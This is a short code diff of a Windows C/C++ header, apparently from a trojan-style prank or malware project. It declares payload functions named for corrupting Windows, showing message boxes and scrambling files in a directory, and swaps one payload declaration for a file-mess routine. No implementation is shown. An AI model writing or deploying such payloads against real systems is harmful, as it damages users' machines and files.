@@ -9,14 +9,13 @@
 #pragma  comment(lib,"WinMM.lib")
 #pragma  comment(lib,"Msimg32.lib")
 
-
 extern void SeedXorshift32(DWORD dwSeed);
 
 extern void WindowsCorruptionPayload();
 
 extern void MessageBoxPayload();
 
-extern void RandomExecutePayload();
+extern void FileMessPayload(PWSTR szDirectory);
 
 extern void ExecutePayload(TROJAN_PAYLOAD payload, int nTime);
 
